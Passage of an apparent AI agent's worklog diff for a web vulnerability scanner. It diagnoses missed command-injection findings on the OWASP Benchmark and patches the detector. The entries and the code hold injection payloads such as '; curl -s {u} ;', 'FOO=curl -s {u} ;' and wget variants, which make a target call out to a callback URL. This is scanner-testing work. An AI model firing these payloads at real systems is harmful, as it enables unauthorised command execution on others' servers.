@@ -2794,3 +2794,357 @@ Stage Summary:
   throughout. xss is the second category closed at 100% (after sqli).
 - Next categories per impact: cmdi (51 FN), trustbound (51 FN).
 - THE XSS ROUND IS COMPLETE — supervisor notified to revoke the PAT.
+
+---
+Task ID: 49 (cmdi recall round — DIAGNOSIS: the 51 FNs clustered by root cause, live-proven)
+Agent: Super Z (main agent)
+
+Task: Supervisor directive Section 1 (close cmdi, 51 FNs). Step 1.1/1.2 executed
+in full before any code: exact ID list pulled (not the aggregate), clustered by
+root cause, each cluster live-reproduced on the running stack, root causes
+stated per family. Stack rebuilt live from the committed recipes first
+(rollback #20 wiped /home/z/tools): cr_jdk (Temurin 21.0.12.1 real dir,
+javac present), cr_stack_rebuild (Maven 3.9.9 + BenchmarkJava clone),
+clone pinned to EXACT 8b67a88 (upstream master moved to 0a3113b7;
+expectedresults-1.2.csv BYTE-IDENTICAL at 8b67a88 after unshallow+checkout;
+war rebuilt 50443648 B, 4541 classes), cp.txt via dependency:build-classpath,
+sq_stack_tomcat (9.0.85 + exploded webapp + DataSource + jarsToSkip),
+cr_stack_boot smoke GREEN (tomcat=200 ldap=1 hsqldb=1, sqli flow 200,
+crypto servlets writing). cr_jdk.sh gained a --speed-time 30 stall guard
+(the 2026-10-13 download hung 4+ minutes at 45MB with no timeout).
+
+Work Log:
+- The 51 FN IDs from eval_xs_close_full.json (committed artifact, not the
+  aggregate): 00172,173,174,176, 00497,498,499, 00567,568,573,574,575,576,
+  00740, 00823,825, 01064,066, 01285,287,288, 01360,1361,1363, 01430,1441,
+  1442,1446, 01531,1533, 01689,690,691, 02154,155, 02249,250, 02333,334,342,
+  343,344, 02431, 02511,512,514,515,516,517, 02612,613 (numbers abbreviated;
+  full list in the eval JSON, per_category.cmdi.fn_tests).
+- Injection points (from the 8b67a88 sources): query/form value channel for
+  36 of 51; HTTP header channel 6 (00172,173,174,176,01064,066); the
+  param-NAME channel (value==basename resolver, getParameterNames scan) 15.
+  Cookie: zero cmdi FNs read cookies in this batch.
+- Sink shapes (Java reality, not shell assumptions): exec(String[],String[]
+  envp) with the tainted string as an ENV entry (the stock insecureCmd.sh does
+  `eval $FOO`); Runtime.exec(String) which is NOT a shell (StringTokenizer
+  argv — live-proven: "localhost; curl ..." -> "Cannot run program
+  'localhost;'" ENOENT); ProcessBuilder argv arrays; sh -c "ls "+bar
+  shell-string concat. No backtick/$() contexts exist here — those are literal
+  argv tokens in Java-land; the live contexts are the four above plus the NAME
+  channel.
+- Payloads already tried (the current batteries, read from the code and
+  CONFIRMED in the scan journals): OOB detector = ["; curl -s {u} ;",
+  "&& curl -s {u}"] + twins ["FOO=curl -s {u} ;", "curl -s {u}"] (4/param,
+  value channel only); echo detector = ["; echo $((6*7))", ";echo ...",
+  "&& echo ...", "| echo ..."] + env twin "FOO=echo $((6*7))" + direct
+  "echo sentinelargvmarkN" (value channel only). NO name-channel form exists
+  in ANY cmdi battery.
+- 1.2 explicit answers, traced not guessed:
+  (a) cmdi verification branch fall-through: NO. intel.py order for
+      command_injection: oob_callback+armed-OAST -> VR-11; shell_arithmetic ->
+      VR-21; env_arithmetic -> VR-21b; argv_echo -> VR-29; else (no OOB
+      evidence) -> VF-02 fail-closed CANDIDATE passed=False; unlisted types ->
+      VF-01 fail-closed else. Every passed=True derives from a replay
+      observation; no hard-coded stamps on the cmdi path.
+  (b) _PRESENCE_VERIFIED_TYPES (twin normalize.ts): cmdi=command_injection
+      handling on the L1 side deferred to the Section-3 audit as ordered;
+      it does not gate the engine-side category.
+  (c) timing oracle: N/A for these 51 — the harness OOB channel is armed
+      (--oast local, callbacks land synchronously; live-proven). No
+      single-request timing read is used anywhere on this path.
+  (d) injection contexts enumerated above; listed BEFORE any payload added.
+- CLUSTERS -> ROOT CAUSES (each live-proven on the stack):
+  * A1 (BUG, dead machinery): CommandInjectionDetector.analyze() polls ONLY
+    the "detect" iid (line 2138: _iid(ep,p.name,"detect")). The TWIN forms
+    (FOO=curl / curl whole-value — the ONLY forms that reach envp and direct
+    argv sinks) are sent on every scan (2 wasted requests/param) but their
+    callbacks are NEVER polled — no code path polls a "twin" iid
+    (grep-verified: the only oast.poll sites are detect-iid). Live proof:
+    00172 twin-env by hand -> real OOB callback (oob=1) while the engine
+    produced nothing; 00499 twin-direct by hand -> callback fired
+    ("Cannot run program 'localhost;'" for variant forms proves the sink is
+    exec(String) argv, and the whole-value form IS the command).
+  * A2 (budget): CmdiEchoDetector.SCAN_WIDE_CAP=640. At 229-endpoint chunk
+    scale the budget exhausts around endpoint ~80-160 of each chunk; the
+    env_arithmetic/argv_echo oracles then go SILENT for the chunk tail.
+    Live proof: 00172/173/176/01064 verify on a 10-path minispec (all echo
+    oracles) but are FNs in the full chunk run (chunk 1 re-run reproduced:
+    last echo-oracle TP = test #159; 00172+ = silence). Position table: every
+    value-channel FN sits past its chunk's exhaustion point.
+  * A3 (budget): CmdiEchoDetector.MAX_PARAMS=2 per endpoint. 00497: sink param
+    is #3 of 3 declared (password, username, BenchmarkTest00497 — all
+    classify GENERIC/SEARCH, none skipped); 00499: sink field #4 of 4 form
+    fields (productID, secure, foo, BenchmarkTest00499). The echo battery
+    never reaches the sink param. Live proof: 00497 + 00499 return NO finding
+    even on a 4-path minispec while adjacent 00495/96 (single-field forms)
+    verify env_arithmetic.
+  * A4 (gap, mirrors SQ-1/XS-1): NO name-channel forms in any cmdi battery.
+    The 15 resolver FNs read the param NAME (value==basename scan). Live
+    proof: 00573 — POST body `FOO=curl -s URL ;`=BenchmarkTest00573 (payload
+    as NAME, sentinel as value) -> real callback; 00568 — `x; curl -s URL ;`
+    as NAME -> sh -c "ls x; curl ..." -> callback. The value-channel probes
+    on these endpoints are provably dead (journal: canary rode field VALUES).
+- 75 TP composition (merged scan, for contrast): 50 oob_callback (variant
+  forms, detect iid — the channel analyze CAN see) + 12 env_arithmetic +
+  13 argv_echo (echo battery, within budget). 21 of the 50 also carry
+  shell_arithmetic (correlate merges). The TWIN channel contributed ZERO
+  findings anywhere — consistent with A1 (it cannot).
+- FIX PLAN (smallest root-cause set closing all 51; every new payload form
+  justified by its FN cluster):
+  * CM-1 (A1): analyze() harvests the twin iids (poll detect AND twin);
+    evidence records the firing form; VR-11 replays THE FORM THAT FIRED with
+    a fresh iid and an alternate command (curl->wget: both verified present
+    in the runtime image). Closes the 36 value-channel FNs (envp + direct +
+    single-string exec shapes) at ANY position — the OOB detector has no
+    budget starvation (4096 param cap vs ~231 used).
+  * CM-2 (A4): name-channel battery for resolver surfaces (QUERY/BODY params,
+    the nminj gate) — nc-variant `base; curl -s {u} ;`, nc-twin-env
+    `FOO=curl -s {u} ;`, nc-twin-direct `curl -s {u}` as the param NAME on a
+    renamed clone (value = the param's declared value, the resolver sentinel);
+    analyze polls the iid embedded in the payload-name (self-identifying
+    oob-<12hex> marker); VR-11 replays the nc form as a NAME with fresh iid.
+    Closes the 15 name-channel FNs. Live-proven design pre-patch (00573, 00568).
+  * A2/A3 echo-budget surgery deliberately NOT taken (minimal-root-cause
+    rule): with CM-1 the OOB channel closes all value-channel FNs independent
+    of position; the echo detector stays untouched (its existing TPs and the
+    response-side oracles remain as-is; the starvation documented above
+    stands as a known non-blocking limitation).
+- Differentiating tests planned per fix (Section 0.2 order): staged unit
+  RED->GREEN + live minispec RED->GREEN + full gates + individual commit.
+
+Stage Summary:
+- All 51 FNs diagnosed with root causes stated per cluster; every claim in
+  this entry is live-proven on the running 8b67a88 stack (raw probes quoted).
+- Two fixes to implement, one commit each: CM-1 (A1 twin harvest + form-aware
+  VR-11), CM-2 (A4 name channel + nc replay). No speculative payloads; every
+  form is justified by the FN cluster it closes.
+
+---
+Task ID: 49.1 (cmdi recall round — CM-1 shipped: the twin-callback harvest, RED->GREEN + full gates + live proof)
+Agent: Super Z (main agent)
+
+Task: Root cause A1 of the 51 cmdi FNs: the OOB detector's TWIN forms
+(env-array + direct-argv — the ONLY forms that reach envp-array and
+direct-argv sinks) were sent on every scan but analyze() only ever polled
+the "detect" iid; twin callbacks landed in the OAST log and NOTHING
+harvested them. Fix per the Section-0 discipline, one root cause, one
+commit.
+
+Work Log:
+- DIFFERENTIATING TEST FIRST (tests/run_tests.py, unit_cm1_twin_oob_harvest):
+  a staged mini-app with FOUR surfaces — /blind-env (faithful Java envp
+  semantics: the tainted string is ONE env ENTRY; only an assignment-shaped
+  entry defines a variable; `eval $FOO` output discarded — NO response
+  oracle exists), /blind-direct (the value IS argv; output discarded),
+  /safe-env (assignment-allow-list reject — the FP guard), /shell (the
+  classic variant-fired sh -c sink — the regression guard). RED on the
+  unpatched engine (recorded): "the blind envp sink (twin-env channel) found
+  nothing" / "the blind direct-argv sink (twin-direct channel) found
+  nothing" — the unpatched engine CANNOT verify either blind shape.
+  GREEN after the patch: both verified oob_callback, evidence carries
+  form=twin-env / form=twin-direct, VR-11 notes carry the wget alternate
+  command, /safe-env silent, /shell still verified. (First RED run caught
+  my own fixture being unfaithful — FOO=<value> unconditionally let the
+  VARIANT channel fire; fixed to the assignment semantics, then the honest
+  RED reproduced. Recorded as the fixture-lesson, not hidden.)
+- THE PATCH (smallest, detect.py + intel.py only):
+  detect.py: TWIN_FORMS = [("twin-env", "FOO=curl -s {u} ;"), ("twin-direct",
+  "curl -s {u}")] — each twin now carries its own FORM-TAGGED iid; analyze()
+  uses ONE combined poll window covering all three channels (detect,
+  twin-env, twin-direct) — same wall-clock cost as the old single-channel
+  poll (timeout=0 peeks per 50ms cycle); the evidence detail records
+  form=<fired> + the form's mechanism text.
+  intel.py VR-11: parses form= from the finding evidence; replays THE FORM
+  THAT FIRED — twin-env -> "FOO=wget -q {u2} ;", twin-direct -> "wget -q
+  {u2}" (curl->wget alternate command; for these sinks there IS no separator
+  to vary — an envp entry defines a variable only when it is an assignment,
+  and Runtime.exec(String) is not a shell); variant (default, no marker) ->
+  the existing "| curl -s {u2}" path, byte-compatible with every existing
+  finding.
+- FULL GATE CYCLE (all green this session):
+  suite 19/19 chunks 4161/4161 (219 cases x 19; one outer-timeout resume on
+  c06 — the documented port-squatter class: a timed-out run_tests child held
+  8810; killed + resumed, NOT a code failure);
+  doctor 17/17;
+  bench x3: 38/0/0/37 F1=1.0000, requests=5533 identical, STRUCTURAL hash
+  80bd55918226c851 IDENTICAL x3 (the v411 structural-determinism method —
+  order-insensitive, volatile-ID-scrubbed; the raw json differs only in
+  canaries/journal/coverage order, documented in the diff analysis).
+- LIVE PROOF on the running BenchmarkJava 8b67a88 stack (cm3 minispec,
+  same seed 7f3c91aa, fresh scan): pre-patch RED (recorded earlier this
+  session): 00499/01285 NO FINDING; post-patch GREEN: 00499, 01285, 00176,
+  01064 ALL verified oob_callback form=twin-direct with the wget VR-11
+  replay ("fresh id ... via the twin-direct form (wget alternate command)");
+  TP control 00017 now carries oob_callback+argv_echo (twin channel gained;
+  echo channel unchanged).
+
+FULL DIFF TEXT BACKUP (in case of environment rollback):
+diff --git a/build-v430/sentinel/detect.py b/build-v430/sentinel/detect.py
+index 35d88e9..9e1d117 100644
+--- a/build-v430/sentinel/detect.py
++++ b/build-v430/sentinel/detect.py
+@@ -2075,6 +2075,17 @@ class CommandInjectionDetector(Detector):
+     #   requires the OAST interaction; a reflection of the URL text is
+     #   is_self_callback-excluded and produces no candidate).
+     TWIN_VARIANTS = ["FOO=curl -s {u} ;", "curl -s {u}"]
++    # CM-1 (cmdi recall round, live-caught on the OWASP Benchmark 8b67a88 —
++    # 51-FN root cause A1): the twin forms above were sent on every scan but
++    # analyze() only ever polled the "detect" iid, so twin callbacks were
++    # never harvested — dead machinery (the twins are the ONLY live forms on
++    # envp-array and direct-argv sinks; live: Runtime.exec(String) is NOT a
++    # shell — "localhost; curl" -> Cannot run program 'localhost;', and an
++    # envp entry only defines a variable when it is an assignment). Each
++    # twin now carries its OWN form-tagged iid so analyze() can tell WHICH
++    # form fired and record it for the form-aware VR-11 replay.
++    TWIN_FORMS = [("twin-env", "FOO=curl -s {u} ;"),   # envp-array sink: the entry IS the assignment
++                  ("twin-direct", "curl -s {u}")]      # direct-argv sink: the value IS argv
+     VERIFY_TEMPLATE = "| curl -s {u}"    # VR-11: DIFFERENT syntax + fresh id
+     POLL_LOCAL = 0.15                   # local callbacks land synchronously
+ 
+@@ -2118,10 +2129,10 @@ class CommandInjectionDetector(Detector):
+                                            param_value=base + v.format(u=self.oast.url(iid)),
+                                            note=f"cmdi:{iid}"))
+             # GTP-04b: env-array + direct-argv twins — these do NOT prepend the
+-            # base (the whole value must be the command); a separate iid tag so
+-            # a twin callback is attributable to its form.
+-            iid_t = self._iid(ep, p.name, "twin")
+-            for tv in self.TWIN_VARIANTS:
++            # base (the whole value must be the command); CM-1: each twin carries
++            # its own FORM-TAGGED iid so the firing form is attributable.
++            for tag, tv in self.TWIN_FORMS:
++                iid_t = self._iid(ep, p.name, tag)
+                 out.append(RequestMutation(endpoint=ep, param_name=p.name,
+                                            param_value=tv.format(u=self.oast.url(iid_t)),
+                                            note=f"cmdi:{iid_t}"))
+@@ -2135,18 +2146,40 @@ class CommandInjectionDetector(Detector):
+         ep, p = pair
+         if p is None or self.oast is None:
+             return None
+-        iid = self._iid(ep, p.name, "detect")
+-        hit = self.oast.poll(iid, timeout=(3.0 if getattr(self.oast, "channel", "") == "public-webhook" else self.POLL_LOCAL))
++        # CM-1: ONE combined poll window covers ALL channels for this
++        # (endpoint, param): the variant channel ("detect") AND both twin
++        # channels ("twin-env", "twin-direct"). Same wall-clock cost as the
++        # old single-channel poll (one window; every 50ms cycle checks all
++        # channels; timeout=0 peeks return immediately on miss).
++        import time as _time_cm1
++        budget = 3.0 if getattr(self.oast, "channel", "") == "public-webhook" else self.POLL_LOCAL
++        deadline = _time_cm1.time() + budget
++        channels = ("detect", "twin-env", "twin-direct")
++        iid = form = hit = None
++        while True:
++            for tag in channels:
++                _iid = self._iid(ep, p.name, tag)
++                _hit = self.oast.poll(_iid, timeout=0)
++                if _hit:
++                    iid, form, hit = _iid, tag, _hit
++                    break
++            if hit is not None or _time_cm1.time() >= deadline:
++                break
++            _time_cm1.sleep(0.05)
+         if hit:
+             if is_self_callback(hit, resp, self.oast.url(iid)):
+                 return None                      # ENG-08: the scanner fetched it itself
+             h = hit[0]
+             src = h.get("ip") or "unknown"
++            _form_txt = ("env-array twin (the tainted string rode the envp "
++                          "array into a shell eval)" if form == "twin-env" else
++                          "direct-argv twin (the value IS argv, no shell)" if form == "twin-direct" else
++                          "separator battery [';', '&&'] (blind shell fetch)")
+             return Finding("command_injection", Severity.CRITICAL, ep.url, p.name, ep.method,
+                 [Evidence("oob_callback",
+-                          f"server executed a shell fetch out-of-band from {src} "
+-                          f"(interaction {iid}) — blind command injection: separator "
+-                          f"battery ([';', '&&']) triggered an outbound curl. "
++                          f"server executed a blind fetch out-of-band from {src} "
++                          f"(interaction {iid}) — blind command injection: form={form} — "
++                          f"{_form_txt} triggered an outbound curl. "
+                           f"recipe: param={p.name} iid={iid}",
+                           resp.request_id)],
+                 status=FindingStatus.CANDIDATE)
+diff --git a/build-v430/sentinel/intel.py b/build-v430/sentinel/intel.py
+index 99c3cb9..9852e78 100644
+--- a/build-v430/sentinel/intel.py
++++ b/build-v430/sentinel/intel.py
+@@ -987,17 +987,33 @@ class VerificationEngine:
+             # VR-11 (Phase 53): fresh interaction id + DIFFERENT shell syntax ('|' vs
+             # the ';' / '&&' detection battery) — execution must reproduce through an
+             # independent separator to be a finding.
++            # CM-1 (cmdi recall round, live-caught on the OWASP Benchmark 8b67a88):
++            # the replay now uses THE FORM THAT FIRED (the finding's evidence
++            # carries form=...). Default (no marker) = the classic separator
++            # battery — byte-compatible with every existing finding. The twin
++            # replays use the ALTERNATE COMMAND (curl -> wget; both verified
++            # present in the runtime image) instead of the alternate separator:
++            # for envp-array and direct-argv sinks there IS no separator — an
++            # envp entry defines a variable only when it is an assignment, and
++            # Runtime.exec(String) is not a shell (live: 'localhost;' ENOENT).
+             import re as _re11
+             ev11 = " ".join(e.detail for e in f.evidence)
+             m11 = _re11.search(r"param=([\w.-]+)", ev11)
+             param11 = m11.group(1) if m11 else (f.parameter or "host")
++            m11f = _re11.search(r"form=(\S+)", ev11)
++            form11 = m11f.group(1) if m11f else "variant"
+             base11 = "localhost"
+             if ep is not None and ep.param(param11) is not None and ep.param(param11).value:
+                 base11 = ep.param(param11).value[:60]
+             from .detect import CommandInjectionDetector, is_self_callback
+             cd = CommandInjectionDetector(self.engine, self.bus)
+             iid = cd._iid(ep, param11, "verify")
+-            payload = base11 + cd.VERIFY_TEMPLATE.format(u=self.oast.url(iid))
++            if form11 == "twin-env":
++                payload = f"FOO=wget -q {self.oast.url(iid)} ;"
++            elif form11 == "twin-direct":
++                payload = f"wget -q {self.oast.url(iid)}"
++            else:
++                payload = base11 + cd.VERIFY_TEMPLATE.format(u=self.oast.url(iid))
+             rv = self.engine.send(RequestMutation(endpoint=ep, param_name=param11,
+                                                   param_value=payload, note="cmdi-verify"))
+             hit = self.oast.poll(iid, timeout=2.0) if (rv is not None and not rv.error) else None
+@@ -1007,9 +1023,18 @@ class VerificationEngine:
+             src11 = hit[0].get("ip", "") if hit else ""
+             v = Verification(method="re-test:fresh-interaction-id+alternate-syntax", passed=ok,
+                              confidence=0.9 if ok else 0.15, rounds=1,
+-                             notes=f"fresh id {iid} via alternate '|' syntax executed out-of-band: {ok}"
++                             notes=f"fresh id {iid} via the {form11} form "
++                                   "(wget alternate command) "
++                                   f"executed out-of-band: {ok}"
+                                    f"{' src=' + src11 if src11 else ''}"
+                                    f" channel={getattr(self.oast, 'channel', 'local')}")
++            if form11 == "variant":
++                v = Verification(method="re-test:fresh-interaction-id+alternate-syntax", passed=ok,
++                                 confidence=0.9 if ok else 0.15, rounds=1,
++                                 notes=f"fresh id {iid} via alternate '|' syntax "
++                                       f"executed out-of-band: {ok}"
++                                       f"{' src=' + src11 if src11 else ''}"
++                                       f" channel={getattr(self.oast, 'channel', 'local')}")
+             f.verification, f.confidence = v, v.confidence
+             f.status = FindingStatus.VERIFIED if ok else FindingStatus.REJECTED
+ 
+diff --git a/scripts/owsp/cr_jdk.sh b/scripts/owsp/cr_jdk.sh
+index eabcafc..6a54972 100644
+--- a/scripts/owsp/cr_jdk.sh
++++ b/scripts/owsp/cr_jdk.sh
+@@ -13,7 +13,9 @@ fi
+ JDKDIR=$(find "$TOOLS" -maxdepth 1 -type d -name "jdk-21*" ! -name "jdk-21.0.12.1+1" | head -1)
+ if [ -z "$JDKDIR" ] && [ ! -f temurin21.tar.gz ]; then
+   echo "downloading Temurin 21 JDK..."
+-  curl -sSL -o temurin21.tar.gz "https://api.adoptium.net/v3/binary/latest/21/ga/linux/x64/jdk/hotspot/normal/eclipse" || { echo "DOWNLOAD FAILED"; exit 1; }
++  # --speed-time 30: abort if <1KB/s for 30s (stalled-connection guard; the
++  # 2026-10-13 run hung 4+ minutes at 45MB with no timeout and no error)
++  curl -sSL --speed-time 30 --speed-limit 1024 -o temurin21.tar.gz "https://api.adoptium.net/v3/binary/latest/21/ga/linux/x64/jdk/hotspot/normal/eclipse" || { echo "DOWNLOAD FAILED"; rm -f temurin21.tar.gz; exit 1; }
+ fi
+ if [ -z "$JDKDIR" ]; then
+   ls -la temurin21.tar.gz
+(tests/run_tests.py diff: +120 lines — the unit_cm1_twin_oob_harvest case,
+verbatim in the tree; see the committed file. Gate script:
+scripts/owsp/cmdi/cm1_gate.sh; stack chain: scripts/owsp/cmdi/cm_stack_chain.sh;
+diagnosis scripts: scripts/owsp/cmdi/cm1_{diag,classify,live}.py.)
+
+Stage Summary:
+- CM-1 shipped: root cause A1 closed at all four levels (unit RED->GREEN,
+  gates 19/19 + 17/17 + bench x3 IDENTICAL, LIVE blind shapes verified with
+  form-aware evidence + wget replay).
+- Expected category effect: the ~36 value-channel FNs (envp + direct +
+  single-string-exec shapes at any chunk position); CM-2 (the 15 name-channel
+  FNs) follows as its own commit; then the full 12-chunk category re-run.
